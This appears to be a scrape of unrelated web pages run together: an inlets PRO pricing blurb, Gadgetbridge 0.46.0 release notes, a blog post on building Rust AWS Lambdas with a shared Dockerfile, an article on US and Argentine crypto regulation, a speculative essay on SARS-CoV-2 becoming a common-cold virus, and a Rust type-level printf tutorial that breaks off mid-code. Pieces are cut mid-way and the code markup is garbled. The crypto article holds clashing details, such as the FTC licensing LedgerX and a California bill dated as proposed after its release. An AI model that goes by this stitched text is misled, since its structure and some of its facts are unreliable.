<p>With the launch of the <a href="https://inlets.dev/">landing page for inlets PRO</a> you'll find a personal pricing option that gives unlimited use, a commercial option, and enterprise. The commercial option is not billed per month, because to keep inlets PRO completely private, there is no tracking included. Users are trusted to buy the right license for what they are using, and in return, no usage or tracking data will be collected.</p>

August 13, 2020 | https://blog.freeyourgadget.org/release-0_46_0.html | <a href="https://web.archive.org/web/*/https://blog.freeyourgadget.org/release-0_46_0.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Gadgetbridge 0.46.0 has been release and after a whole week of waiting it
landed in F-Droid.</p>
<p>This release, which adds TLW64 support contributed by Erik Bloß, also has
support for the new Mi Band 5, which is basically runnig on the Mi Band 4 code.</p>
<p>On the Huami front there are fixes for GTR/GTS activity data on newer
firmware version. There seems to be extra data which we ignore for now to make
the current code run with it. In the future we will look at making use of
the new data which unfortunately would need a new database schema.</p>
<p>Another quite big changes was contributed by Taavi Eomäe, who refactored the
device discovery activity which fixes tons of bugs and also new features,
like displaying already paired devices an notes about devices needing a
pairing key.</p>
<p>The release 0.45.0 did not have its own blog post, please refer to the list below
for details on what changed with the 0.45.0 and 0.45.1 releases.</p>
<p>But there is one thing I would like to highlight. There is a new,
experimental way of getting weather data from an new open source app developed
by Pawel Dube, that directly supports Gadgetbridge. No need for API keys.
The App is still alpha and work in progress, but we highly recommend trying it.
<a href="https://codeberg.org/Starfish/TinyWeatherForecastGermany">TinyWeatherForecast</a>
Don't be fooled by the name it supports a lot of locations worldwide.
If you like it please give it a star on Codeberg.org!</p>
<p>For all user-facing changes since the previous blog post, check the following list:</p>
<h4>0.46.0</h4>
<ul>
<li>Initial support for Mi Band 5</li>
<li>Initial support for TLW64</li>
<li>Amazfit GTR/GTS: Fix broken activity data on newer firmwares</li>
<li>Big refactoring of the device discovery activity (See PR #1927 description for details)</li>
<li>Add about screen</li>
<li>New icon for Amazfit Bip</li>
<li>Avoid duplicated entries in preferred media player selection</li>
<li>Avoid a lot of crashes and improve error handling in various places</li>
</ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure id="w-node-c687bec1ed8c-01d6604b"><p><img src="https://assets.website-files.com/56d31f469aaa616f5089a267/5f23ffebdba110f2cab1d06d_Rust%20Lambda.png" alt=""></p></figure><div><p>Update:&nbsp;Join the discussion over at <a href="https://news.ycombinator.com/item?id=24154506">HackerNews</a>! </p><p>We’ve written in the past about how the CV Partner web application is written in Ruby on Rails. The web application isn’t the whole story, though. Surrounding it are many supporting services, and we are increasingly using Rust to write these services.</p></div><p>We’re also using more Lambdas in our architecture, and we want to use Rust in those as well. The landscape for Rust lambdas isn’t barren, but it’s not well-trodden either.<br></p><p>This post is going to cover how we write, build, and deploy our Rust lambdas. Our lambdas have the following qualities that we’re proud of and want to share with you:<br></p><ol role="list"><li><strong>Fast, standardised build.</strong> All of our lambdas use the same Dockerfile to build, and make good use of Docker’s layer caching. Incremental builds in CI take under a minute.</li><li><strong>Run locally. </strong>If you’re working on a lambda, you don’t want to have to sit through a CI build to see if your changes work. All of our lambdas can run locally and in AWS using the same code.</li><li><strong>Private GitHub dependencies. There aren’t many options out there for private Cargo repositories, so we use private GitHub repositories for our internal libraries.</strong></li></ol><h2>The code<br></h2><p>The starting point for writing a Lambda in Rust is to use the official <a href="https://github.com/awslabs/aws-lambda-rust-runtime">Rust lambda runtime</a>. At the time of writing, the last release of this library is version 0.2, which doesn’t support async/await. Async/await support is present in master, though. Here’s how it looks in practice:</p><div><pre><code>
use lambda::{lambda, Context};
use serde_json::Value;

type Error = Box<dyn std::error::error="" +="" send="" sync="" 'static="">;

#[lambda]
#[tokio::main]
async fn main(event: Value, _: Context) -&gt; Result<value, error=""> {
    Ok(event)
}

</value,></dyn></code></pre></div><p>The problem with this is that you can’t run it locally. The #[lambda] attribute wraps your main function in another main function that calls in to the AWS lambda API.<br></p><p>To get around this, we write two main functions:<br></p><div><pre><code>

#[cfg(feature = "with-lambda")]
use lambda::{lambda, Context};
use serde::{Deserialize, Serialize};

type Error = Box<dyn std::error::error="" +="" send="" sync="" 'static="">;

#[derive(Deserialize, Debug)]
struct Input {
    name: String
}

#[derive(Serialize, Debug)]
struct Output {
    greeting: String
}

async fn handler(input: Input) -&gt; Result<output, error=""> {
    Ok(Output { greeting: format!(“Hello, {}!”, input.name) })
}

#[cfg(feature = "with-lambda")]
#[lambda]
#[tokio::main]
async fn main(input: Input, _: Context) -&gt; Result<output, error=""> {
    handler(input).await
}

#[cfg(not(feature = "with-lambda"))]
#[tokio::main]
async fn main() -&gt; Result&lt;(), Error&gt; {
    let input_str = std::env::args().nth(1);
    if input_str.is_none() {
        panic!(
            "you must pass an input parameter as the first argument, and it must be a JSON string"
        );
    }
    let input = serde_json::from_str(&amp;input_str.unwrap())?;
    let output = handler(input).await?;
    println!("{}", serde_json::to_string(&amp;output)?);
    Ok(())
}

</output,></output,></dyn></code></pre></div><p>We’re making use of Rust’s “feature” flags to compile a different harness around the handle function depending on whether we want to run locally or in AWS.</p><p>Here’s the Cargo.toml file:</p><div><pre><code>
[package]
name = "rust-lambda-template"
version = "0.1.0"
authors = ["Sam Rose <sam@cvpartner.com>"]
edition = "2018"

[dependencies]
lambda = { git = "https://github.com/awslabs/aws-lambda-rust-runtime/", rev = "c8dbcd39e0b1cf9ecf395e2b2f9df6c6c0d97780" }
tokio = { version = "0.2", features = ["full"] }
serde = { version = "1", features = ["derive"] }
serde_derive = "1"
serde_json = "1"

[features]
with-lambda = []

</sam@cvpartner.com></code></pre></div><p>Two noteworthy things:<br></p><ol role="list"><li>We’re using a version of the aws-lambda-rust-runtime that hasn’t officially been released. This isn’t ideal, and we’re eagerly awaiting a 0.3 release.</li><li>We have a features section, which is where we define the with-lambda feature we use in the Rust code shown above.<br></li></ol><p>Running our lambda now gives us the following:</p><div><pre><code>
$ cargo run -- ‘{ “name”: “Sam” }’
{ “message”: “Hello, Sam!” }

</code></pre></div><h2><strong>The Dockerfile</strong></h2><p>All of our lambdas build with the same Dockerfile. I’ll show it in all of its glory and then explain what’s going on bit by bit. Brace yourself.</p><div><pre><code>
# syntax=docker/dockerfile:experimental

FROM rust:latest as cargo-build
ARG name

RUN apt-get update
RUN apt-get install musl-tools -y
RUN rustup target add x86_64-unknown-linux-musl

WORKDIR /usr/src/${name}
COPY Cargo.toml Cargo.toml
RUN mkdir src/
RUN echo "fn main() {println!(\"if you see this, the build broke\")}" &gt; src/main.rs
RUN mkdir -p $HOME/.ssh
RUN ssh-keyscan github.com &gt; $HOME/.ssh/known_hosts
RUN test "$(cat $HOME/.ssh/known_hosts | ssh-keygen -lf -)" = "2048 SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8 github.com (RSA)"
RUN --mount=type=ssh RUSTFLAGS=-Clinker=musl-gcc cargo build --features with-lambda --release --target=x86_64-unknown-linux-musl

RUN rm src/main.rs
COPY src/* src
RUN touch src/**
RUN --mount=type=ssh RUSTFLAGS=-Clinker=musl-gcc cargo test --features with-lambda --release --target=x86_64-unknown-linux-musl
RUN --mount=type=ssh RUSTFLAGS=-Clinker=musl-gcc cargo build --features with-lambda --release --target=x86_64-unknown-linux-musl

FROM alpine:latest
ARG name
COPY --from=cargo-build /usr/src/${name}/target/x86_64-unknown-linux-musl/release/${name} /usr/local/bin/${name}

</code></pre></div><p>First of all, shout out to Shane Utt whose <a href="https://shaneutt.com/blog/rust-fast-small-docker-image-builds/">blog post</a> we used as a starting point for this.<br></p><p>The first line is a Docker directive that says we want to use some experimental Dockerfile syntax. The syntax in question is the --mount=type=ssh flag to the RUN commands, but we’ll talk about later.</p><div><pre><code>
FROM rust:latest as cargo-build
ARG name

</code></pre></div><p>This next bit says we want to use the latest Rust image, and we’re passing in a build arg called “name.” This is how we’re able to share this Dockerfile between all of our lambdas without having to modify it.</p><div><pre><code>
RUN apt-get update
RUN apt-get install musl-tools -y
RUN rustup target add x86_64-unknown-linux-musl

</code></pre></div><p>Next we run an update on the image, and we install <a href="https://musl.libc.org/">musl</a>. If you’re not familiar, musl is a libc replacement that you can link to statically. This means the resulting binary won’t depend on the system’s libc, which makes it more portable. It’s not a strict requirement for running on AWS Lambda, but it’s good practice.</p><div><pre><code>
WORKDIR /usr/src/${name}
COPY Cargo.toml Cargo.toml
RUN mkdir src/
RUN echo "fn main() {println!(\"if you see this, the build broke\")}" &gt; src/main.rs

</code></pre></div><p>The next few lines set up a pseudo project, where the only things we’re going to compile are our dependencies and a dummy main.rs. The idea behind this is to use Docker’s layer caching to avoid having to compile our dependencies every build. This leads to significantly faster incremental builds in Docker.</p><div><pre><code>
RUN mkdir -p $HOME/.ssh
RUN ssh-keyscan github.com &gt; $HOME/.ssh/known_hosts
RUN test "$(cat $HOME/.ssh/known_hosts | ssh-keygen -lf -)" = "2048 SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8 github.com (RSA)"

</code></pre></div><p>Up until now, we’ve done exactly what Shane Utt did in his version of this. These three lines, though, are new. Because we use SSH to fetch private dependencies (more on this later), we would sometimes find that our builds would fail with the error “host key verification failed.” To get around that we pull down GitHub’s host keys and make sure they’re what we expect them to be based on the values <a href="https://docs.github.com/en/github/authenticating-to-github/githubs-ssh-key-fingerprints">here</a>.</p><div><pre><code>
RUN mkdir -p $HOME/.ssh
RUN --mount=type=ssh RUSTFLAGS=-Clinker=musl-gcc cargo build --features with-lambda --release --target=x86_64-unknown-linux-musl

</code></pre></div><p>Our first bit of experimental syntax! The --mount flag is a new thing introduced with the BuildKit engine for Docker, you can read about it in depth <a href="https://medium.com/@tonistiigi/build-secrets-and-ssh-forwarding-in-docker-18-09-ae8161d066">here</a>. The type=ssh bit is us telling Docker that we want to use an SSH agent for this command. In the docker build invocation, which we’ll see later, we can tell Docker what keys to add to this SSH agent.</p><p>The reason we do this is because it was the only way we could find that let us depend on private GitHub repositories in our Cargo.toml file, in a way that worked both locally and in CI. It means we can do this in our Cargo.toml file:</p><div><pre><code>
[dependencies]
private-library = { git = "ssh://github.com/cvpartner/private-library", tag = "1.0" }

</code></pre></div><p>And it Just Works<strong>™</strong>.</p><p>The rest of the RUN command is our first cargo build. It looks a lot scarier than it is. Most of it is us telling rustc to link against musl instead of the default libc. The only other interesting bit is the --features with-lambda. This matches up with the code we saw earlier to produce a binary that’s going to work properly when deployed in AWS.</p><div><pre><code>
RUN rm src/main.rs
COPY src/* src
RUN touch src/**
RUN --mount=type=ssh RUSTFLAGS=-Clinker=musl-gcc cargo test --features with-lambda --release --target=x86_64-unknown-linux-musl
RUN --mount=type=ssh RUSTFLAGS=-Clinker=musl-gcc cargo build --features with-lambda --release --target=x86_64-unknown-linux-musl

</code></pre></div><p>Next up, we’re copying over our actual source code. The touch command is necessary for cargo to realise the files are new, because when we created our dummy main.rs file earlier we created a new file with a timestamp later than the one on the real main.rs file. This is different to the approach taken by Shane Utt, as we found that approach would often result in builds where the dummy main.rs file was the one that ended up in the final build.</p><p>Another addition is the cargo test invocation. Tests are good!</p><div><pre><code>
FROM alpine:latest
ARG name
COPY --from=cargo-build /usr/src/${name}/target/x86_64-unknown-linux-musl/release/${name} /usr/local/bin/${name}

</code></pre></div><p>Lastly we create a new build stage and copy over the final executable. The new build stage is in order to keep the final image small. Ours tend to clock in at around 8MB.<br></p><h2><strong>The build script</strong><br></h2><p>Invoking Docker is done in a shell script which is also identical for all of our lambdas.</p><div><pre><code>
#!/usr/bin/env bash

set -e
set -x

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &amp;&amp; pwd )"
cd $DIR

NAME=$(cat Cargo.toml | grep "name" | head -n 1 | sed -E 's/name = "(.*)"/\1/')
DOCKER_NAME="cvpartner/$NAME"

if [[ -z $BUILD_ID ]];
then
  TAG=$DOCKER_NAME
  SSH="--ssh default"
else
  TAG="our.private.docker.registry/$DOCKER_NAME"
  SSH="--ssh default=/home/ci/.ssh/id_rsa"
fi

DOCKER_BUILDKIT=1 docker build $SSH --cache-from $TAG …</code></pre></div></div></div>

		</div>

			</div>
</article>

<section><div><div><div><div><div><h2>Introduction</h2>
	<div>
		<p><span>Cryptocurrencies in America are not considered legal tender. However, Cryptocurrency exchanges are legal and the regulations vary by state. In this article, we will be discussing the entire regulation and taxation situation in the US, along with state laws that pertain to Cryptocurrency and blockchain technology. Let’s get started!</span></p>
	</div>
<h2>Cryptocurrency Regulation Outlook</h2>
	<div>
		<div>
			<p><span>It is quite overwhelming to find a reliable lawful approach to Cryptocurrencies in the US. Every law that is governing&nbsp;</span><a href="https://www.espay.exchange/centralized-exchange-solutions"><b>centralized crypto exchanges</b></a><span>&nbsp;varies by state. Moreover, federal authorities differ in their definition of the term – Cryptocurrency. The FinCEN (Financial Crimes Enforcement Network) doesn’t consider Cryptocurrencies to be a legal tender. However, FinCEN has been considering exchanges as money transmitters since 2013, based on the fact the tokens are other value that substitutes for currency. On the contrary, the IRS considers Cryptocurrencies as property and has issued tax regulation for that reason.&nbsp;&nbsp;</span></p>
<p><span>Regulatory laws for Cryptocurrency exchange in the US are also in an indecisive lawful territory. Many of the federal regulators allege jurisdiction. The Securities and Exchange Commission has indicated that it considers Cryptocurrencies as securities. In March 2018, SEC stated that it was seeking to apply securities laws comprehensively for exchanges and digital wallets. On the contrary, the Commodities Futures Trading Commission has adopted a friendly and do-no-harm approach, explaining Bitcoin as a commodity and permitting Cryptocurrency derivatives to buy and sell openly.&nbsp;</span></p>
<p><span>The Justice Department is working with the CFTC and SEC over future Cryptocurrency regulations to make sure that the customers are effectively protected and regulatory oversight is more streamlined. Treasury of the US has emphasized an urgent need for crypto regulation to combat domestic and global criminal activities. In January 2018, Steve Mnuchin and Treasury Secretary declared a new FSOC working group to look at the progressively more crowded Cryptocurrency marketplace.</span></p>
<p><span>In June 2015, New York managed to become the first state of the US to regulate virtual currency companies via state agency rulemaking. In 2019, there were 32 states of the US that introduced legislation accepting or encourage the utilization of Bitcoin and blockchain distributed ledger technology (DLT). A few states passed them into law. However, some of them established task forces to revise the further use of technology. In 2017, the FTC gave LedgerX – Crypto trading platform operator in the US, permission to become the first federally regulated digital currency options exchange and clearinghouse.</span></p>

		</div>
	</div>
<h2> State Regulations Pertaining to Cryptocurrency and the Blockchain Technology</h2><h2>New York</h2>
	<div>
		<div>
			<p><span>Crypto Regulatory Sandbox – In 2015, New York released the “BitLicense” that is needed by any virtual currency company serving New York business owners or residents. The New York State Department of Financial Services (NYDFS) established the BitLicense to provide guardrails that safeguard customers and root out illegal doings without stifling advantageous improvement.&nbsp; According to the legislation, any individual or company who is involved in any of the following activities in New York should obtain a BitLicense:</span></p>
<ol>
<li><span>Performing exchange services as a customer business</span></li>
<li><span>Trading virtual currency as a customer business</span></li>
<li><span>Virtual currency transmission</span></li>
<li><span>Issuing, controlling or administering a virtual currency</span></li>
<li><span>Maintaining custody of virtual currency on the behalf of others</span></li>
</ol>
<p><span>Trading Ban – No</span></p>
<p><span>Banking Ban – No</span></p>
<p><span>Tax Haven Region – No</span></p>
<p><span>Is it best Place for License – Yes, BitLicense can be acquired by following simple instructions in New York</span></p>

		</div>
	</div>
<h2>Washington State</h2>
	<div>
		<div>
			<p><span>Crypto Regulatory Sandbox – In December 2014, the DFI in Washington State formed the Emerging Payments Task Force during the annual conference of State Bank Supervision (CSBS). In September 2015, the annual conference of State Bank Supervision released a model regulatory platform for virtual currencies.&nbsp;</span></p>
<p><span>According to the Washington State’s government, virtual currencies are considered as a digital currency or Cryptocurrency. Virtual currencies are the medium of exchange not adopted by a government. In December 2014, Bitcoin was added to the definition of Money Transmission. Every virtual currency in the state of Washington is subject to the UMSA – Uniform Money Services Act.</span></p>
<p><span>Trading Ban – No</span></p>
<p><span>Banking Ban – No</span></p>
<p><span>Tax Haven Region – Yes</span></p>
<p><span>Is it best Place for License – Yes, Washington has generated a multi-state licensing program to make it easy for companies to comply with crypto regulations.</span></p>

		</div>
	</div>
<h2>California</h2>
	<div>
		<div>
			<p><span>Crypto Regulatory Sandbox – The legislature of California is working on a new set of regulations specifically designed for virtual currencies and inspired by the New York BitLicense. In February 2017, the Virtual Currency Act was a bill proposed to the California Legislature. The Assembly Bill was released by the Legislature in August 2016. Just like the New York BitLicense, already established banks would not be needed to apply for the California Virtual Currency License if they want to involve themselves in the activities of the Cryptocurrency business. Nonetheless, the bill will be needed for any new businesses that lack a bank charter.</span></p>
<p><span>This bill would prohibit an individual from involving in any virtual currency business, as defined, in California unless the individual is licensed by the Commissioner of Business Oversight or is exempt from the licensure prerequisite, as provided. This bill will also need applicants for licensure, including an applicant for licensure and approval to get control of a licensee, in order to pay the commissioner a nonrefundable application fee and finish an application form, amongst other things, prior virtual currency services offered by the applicant, detail of the applicant, a sample form of receipt for transactions concerning the virtual currency business, and specified financial statements.&nbsp;</span></p>
<p><span>Trading Ban – No</span></p>
<p><span>Banking Ban – No</span></p>
<p><span>Tax Haven Region – No</span></p>
<p><span>Is it best Place for License – No, it’s too early to create a license on Bitcoin and other virtual currencies since they are still in the earliest stages of development.</span></p>

		</div>
	</div>
<h2>Argentina</h2>
	<div>
		<div>
			<p><span>According to the National Constitution of this country, the only authority that is able to issue legal currency is the Central Bank. Bitcoins are not lawful currency strictly speaking, as they are not issued by the monetary authorities of the government and are not a legal tender.&nbsp;</span></p>
<p><span>Hence, they can be considered money but not legal currency. They are not an essential means of cancelling debts or obligations.&nbsp;</span></p>
<p><span>Even though Bitcoins are not certainly regulated, they are increasingly being used in this country that has strict controls over foreign currencies. According to some professionals, a bitcoin can be considered a good or a thing under the civil code, and transactions related to Bitcoins can be governed by the rules of the sale of products under the civil code. The latest amendment to the Income Tax Law provides that the gain derived from the sale of digital currency will be considered income and taxed as such.&nbsp;</span></p>
<p><span>Trading Ban –No</span></p>
<p><span>Banking Ban – No</span></p>
<p><span>Tax Haven Region – No</span></p>
<p><span>Is it best place for License – No</span></p>
<p><span>Crypto Regulatory Sandbox – currently, there are no such crypto sandboxes that are designed to promote investment and research in Cryptocurrency in Argentine. Except for the taxation and anti-money laundering regulations, the regulatory authorities have adopted a wait-and-see tactic in regarding to cryptocurrencies. However, the Central Bank has created several research groups – amongst which there are a few groups dedicated to cryptocurrencies and Blockchain technologies.</span></p>

		</div>
	</div>
<h2>Cryptocurrency Taxation Outlook of America</h2>
	<div>
		<div>
			<p><span>In October 2019, the US Internal Revenue Service (IRS) issued new guidelines on the tax treatment of virtual currency willing to assist taxpayers to understand tax and reporting obligations for transactions including virtual currency, along with tax treatment of “hard fork” transactions.</span></p>
<p><span>In the same year, the IRS also released a draft of Schedule 1 to Form 1040. That draft would need taxpayers to answer whether they had any virtual currency-related transactions during the tax year.</span></p>
<p><span>The guidelines issued by IRS and the proposed amendment of Schedule 1 Form part of the Virtual Currency Compliance Campaign of the IRS that was initiated in July 2018 and emphasizes that the tax outcomes of Cryptocurrency or virtual currency transactions are a focal point for the IRS.</span></p>
<p><span>The new guidelines also mention that the income tax treatment of certain transactions that are unique to Cryptocurrency, for example, airdrops and hard forks.</span></p>
<p><span>According to the new guidance issued by the IRS:</span></p>
<ul>
<li><span>A person who is paying tax does not recognize gross income as an outcome of the hard fork of the Cryptocurrency owned by the taxpayer if that person does not receive units of new Cryptocurrency.</span></li>
<li><span>A person who is paying tax does recognize gross income, ordinary in character, as an outcome of an airdrop of new Cryptocurrency following a hard fork if the person who is paying tax receives units of Cryptocurrency. The total amount of the gross income to be recognized is the fair market value of the new Cryptocurrency.</span></li>
<li><span>If the person who is paying tax is capable of selling, transferring, or exchanging, or otherwise disposing of Cryptocurrency, which will be the case once the Cryptocurrency is recorded in the distributed ledger of the taxpayer, then the taxpayer has the vital extent of control and dominion.</span></li>
<li><span>In cases where the ledger of the taxpayer at a Cryptocurrency exchange does not get credited due to the reason that the exchange does not yet favors the new Cryptocurrency, the person who is paying tax does not have dominion until the new Cryptocurrency is accredited.&nbsp;</span></li>
</ul>

<p>What does the future hold for SARS-CoV-2? Will it remain in its current configuration, with 20% of infections causing serious damage? Will everyone on Earth need to be vaccinated regularly to prevent infection? Allow me to indulge in some speculation and suggest that SARS-CoV-2 will eventually become the fifth common cold coronavirus (CoV).</p>
<p>There are five CoV that regularly cause mild upper respiratory tract infections in most humans. Called OC43, HKU1, 229E and NL63, they infect children in their first years of live and cause little disease. Immunity wanes within a year and reinfections occur regularly, but with little consequence.</p>
<p>OC43, HKU1, 229E and NL63 were originally viruses that infect bats and rodents. Hundreds of years ago these viruses spilled over into humans and eventually became the viruses we know today. It is likely that the initial emergence of these viruses from bat and rodent reservoirs led to epidemics that were not noticed. There was no medicine or science or public health to record such epidemics, and given the much smaller human population, they likely spread slowly and were not noticed amid the generally poor state of human health.</p>
<p>It is likely that since their emergence hundreds of years ago, OC43, HKU1, 229E and NL63 slowly underwent change and became less pathogenic for humans. I base this assumption on the fact that contemporary spillovers of CoVs have led to serious disease in humans. In 2003, SARS-CoV emerged from bats into humans and caused severe atypical respiratory disease; however we were able to eradicate this virus after only 8000 known human infections. In 2013, MERS-CoV emerged from camels into humans, but this virus has never been able to establish itself in humans. Every small outbreak is, for the most part, the consequence of a new spillover of virus from camels into humans. These short chains of infection eventually terminate.</p>
<p>However in late 2019 SARS-CoV-2 emerged from bats into humans and established itself as a human virus. It transmits very well among humans and because 80% of infections are mild, it spreads silently. The more serious infections that require hospitalization contribute little to transmission of the virus in the human population. Indeed, these seriously ill patients have problems because their own immune response has gone awry. SARS-CoV-2 is no longer their problem.</p>
<p>It seems likely that with time, SARS-CoV-2 will change so that infected patients no longer develop serious disease. This assumption is based on the fact that causing serious disease is absolutely not required for virus transmission. As the virus moves through humans over the years, its genome will slowly accumulate mutations as a consequence of error-prone replication. Some of these mutations will be lethal and cause viral replication to cease. Other mutations will be tolerated, and among these will be changes that alter the viral reproduction cycle so that serious disease no longer occurs in 20% of infected patients. Although viral reproduction in seriously ill patients is very low, it is likely that some virus-mediated event early in infection sets the stage for the later immune dysregulation. I submit that mutations will eventually accumulate in the viral genome that prevent these late sequelae.</p>
<p>There is good reason to think that SARS-CoV-2 will eventually lose the ability to cause serious disease. The main selective force for viral evolution is transmission; little else matters (viruses can be selected to become drug resistant but such events play a minuscule role in the bigger scheme of viral evolution). Put another way, there is simply no selective advantage for the virus to remain pathogenic as this property contributes nothing to transmission. With no selection to maintain pathogenicity, SARS-CoV-2 will eventually become benign. It will become the fifth common cold CoV.</p>
<p>Why does SARS-CoV-2 cause severe disease in 20% of infected people? Recall that the ancestors of this virus originated in bats where have likely circulated for many thousands of years. These viruses became well adapted to their bat hosts, such that they replicated efficiently and were transmitted effectively to new hosts. Their genome had evolved to co-exist with the unusual immune system of bats, which is tuned to deal with the damage caused by high oxygen usage during flight. Then one day late in 2019 one of these viruses encounters a human host. It replicates well in that host but in the face of a very different immune response, problems such as cytokine storms arise. It will be some years before the genome of SARS-CoV-2 changes sufficiently so that it no longer triggers aberrant immune reactions in the human host.</p>
<p>How long it will take before SARS-CoV-2 changes sufficiently to become common cold CoV #5 is unknown. It depends in part on how well the experimental vaccines currently under development work. I suspect that none of these vaccines will completely block viral reproduction, although they may mitigate disease. Consequently SARS-CoV-2 will continue to circulate and the mutations that will eventually reduce its virulence will arise. I do think that at one day in the future we will no longer need any of the SARS-CoV-2 vaccines that are currently in development, because the virus will no longer cause serious disease. For this reason we do not have vaccines against the four common cold CoVs – there is no medical need for them.</p>
<p>To put this another way, here we have a pandemic virus whose emergence could have been stopped had we invested a few billion dollars in development of pan-CoV antiviral drugs. Instead, many companies and governments are spending billions of dollars to develop vaccines that will one day be obsolete. This lack of vision should infuriate every human on Earth.</p>
<p>Pandemic viruses will continue to emerge from animal reservoirs in the coming years. Will we be ready for them? I doubt it.</p>				</div></div>]]>

    &nbsp; — &nbsp;
    June 21, 2020
  </p>
  <p>I show how to use heterogeneous lists and traits to implement a type-safe printf in Rust. These mechanisms can ensure that two variadic argument lists share important properties, like the number of format string holes matches the number of printf arguments.</p>
  <p><em>Part of an ongoing series about type-level programming in Rust. Consider reading <a href="http://willcrichton.net/notes/type-level-programming/">part one</a> first! All code in this note can be found in <a href="https://gist.github.com/willcrichton/e7fcf1b0e84b4be7f172f0e0245cf149">this gist</a>.</em></p>

<p>Rust has a great printf function, <a href="https://doc.rust-lang.org/std/macro.println.html"><code>println!</code></a>. It has a rich formatting language, but also catches mistakes at compile-time. For example, <code>println!</code> will check that the number of arguments matches the number of holes in the format string:</p>

<div><div><pre><code>error: 2 positional arguments in format string, but there is 1 argument
  --&gt; src/printf.rs:36:13
   |
36 |   println!("{} {}", "Hello");
</code></pre></div></div>

<p>How does the Rust compiler make this check? Because both the format string and the argument are within the macro, Rust will check that the number of holes matches the number of arguments. Consequently, format strings <em>have</em> to be within the macro. If we write:</p>

<div><div><pre><code><span>let</span> <span>s</span> <span>=</span> <span>"{} {}"</span><span>;</span>
<span>println!</span><span>(</span><span>s</span><span>,</span> <span>"hi"</span><span>)</span>
</code></pre></div></div>

<p>This code fails to compile with the error:</p>

<div><div><pre><code>error: format argument must be a string literal
  --&gt; src/printf.rs:42:12
   |
42 |   println!(s, "hi");
</code></pre></div></div>

<p>I’ll show you how to implement type-safe printf without using procedural macros. More generally, this note contains a Rust recipe for functions where:</p>

<ol>
  <li>Arguments are variadic</li>
  <li>Each argument can be a different type (<code>Vec&lt;T&gt;</code> not allowed)</li>
  <li>Multiple variadic inputs share a parallel property, e.g. the number of arguments should match the number of format holes</li>
</ol>

<h2 id="core-mechanism-hlist">Core mechanism: HList</h2>

<p>First, we need to understand the main type-level mechanism: a heterogeneous list (or H-list). An H-list is a sequence of values of potentially different types. For example, <code>[1, "a", true]</code> is an H-list, but not a valid Rust vector. H-lists are implemented in Rust using a linked-list style:</p>

<div><div><pre><code><span>struct</span> <span>HNil</span><span>;</span>
<span>struct</span> <span>HCons</span><span>&lt;</span><span>Head</span><span>,</span> <span>Tail</span><span>&gt;</span> <span>{</span>
  <span>head</span><span>:</span> <span>Head</span><span>,</span>
  <span>tail</span><span>:</span> <span>Tail</span>
<span>}</span>

<span>let</span> <span>example</span><span>:</span> <span>HCons</span><span>&lt;</span><span>i32</span><span>,</span> <span>HCons</span><span>&lt;</span><span>bool</span><span>,</span> <span>HNil</span><span>&gt;&gt;</span> <span>=</span>
  <span>HCons</span><span>{</span><span>head</span><span>:</span> <span>1</span><span>,</span> <span>tail</span><span>:</span> <span>HCons</span><span>{</span><span>head</span><span>:</span> <span>true</span><span>,</span> <span>tail</span><span>:</span> <span>HNil</span><span>}};</span>
</code></pre></div></div>

<p>The key idea is that the type of an H-list changes every time you make a change to it. By contrast, if you push to a <code>Vec&lt;T&gt;</code>, the type of the vector stays the same.</p>

<p>Just like Rust has <code>vec![]</code>, we can use the <a href="https://github.com/lloydmeta/frunk#hlist">frunk</a> crate to get an <code>hlist!</code> macro.</p>

<div><div><pre><code><span>let</span> <span>example</span> <span>=</span> <span>hlist!</span><span>[</span><span>1</span><span>,</span> <span>true</span><span>];</span> <span>// same as above</span>
</code></pre></div></div>

<h2 id="setting-up-printf">Setting up printf</h2>

<p>Let’s go back to the ingredients of printf. We need a format string and an argument list. The key idea is to represent both with an H-list, and carefully use Rust’s traits to ensure our desired property: the number of arguments should match the number of holes.</p>

<p>First, to represent format strings, we will have a sequence of structs that represent each part of the string.</p>

<div><div><pre><code><span>pub</span> <span>struct</span> <span>FString</span><span>(</span><span>&amp;</span><span>'static</span> <span>str</span><span>);</span>
<span>pub</span> <span>struct</span> <span>FVar</span><span>;</span>

<span>// Assume that we compile "Hello {}! The first prime is {}" into this code.</span>
<span>// That would be a simple syntactic transformation.</span>
<span>let</span> <span>example</span> <span>=</span> <span>hlist!</span><span>[</span>
  <span>FString</span><span>(</span><span>"Hello "</span><span>),</span> <span>FVar</span><span>,</span> <span>FString</span><span>(</span><span>"! The first prime is "</span><span>),</span> <span>FVar</span>
<span>];</span>
</code></pre></div></div>

<p>To represent arguments, we will use a matching H-list of values. For example:</p>

<div><div><pre><code><span>let</span> <span>args</span> <span>=</span> <span>hlist!</span><span>[</span><span>"world"</span><span>,</span> <span>2</span><span>];</span>
</code></pre></div></div>

<p>Then, our goal is to create a function <code>format</code> such that this is true:</p>

<div><div><pre><code><span>assert_eq!</span><span>(</span>
  <span>example</span><span>.format</span><span>(</span><span>args</span><span>),</span>
  <span>"Hello world! The first prime is 2"</span>
<span>);</span>
</code></pre></div></div>

<p>And this should be a compile-time (NOT run-time) error:</p>

<div><div><pre><code><span>example</span><span>.format</span><span>(</span><span>hlist!</span><span>[</span><span>"Only one arg"</span><span>]);</span>
</code></pre></div></div>

<h2 id="the-format-trait">The Format trait</h2>

<p>In the spirit of type-level computation, we start by defining a trait.</p>

<div><div><pre><code><span>trait</span> <span>Format</span><span>&lt;</span><span>ArgList</span><span>&gt;</span> <span>{</span>
  <span>fn</span> <span>format</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>args</span><span>:</span> <span>ArgList</span><span>)</span> <span>-&gt;</span> <span>String</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Here, <code>self</code> is the H-list of the format directives, and <code>ArgList</code> is the H-list of the variadic arguments. <code>Format</code> need to take <code>ArgList</code> as a type parameter, because its type will change as we remove elements from the <code>ArgList</code> list.</p>

<p>Now, we proceed to implement the <code>Format</code> trait by cases. First, the base case for reaching the end of the format list <code>HNil</code>:</p>

<div><div><pre><code><span>impl</span> <span>Format</span><span>&lt;</span><span>HNil</span><span>&gt;</span> <span>for</span> <span>HNil</span> <span>{</span>
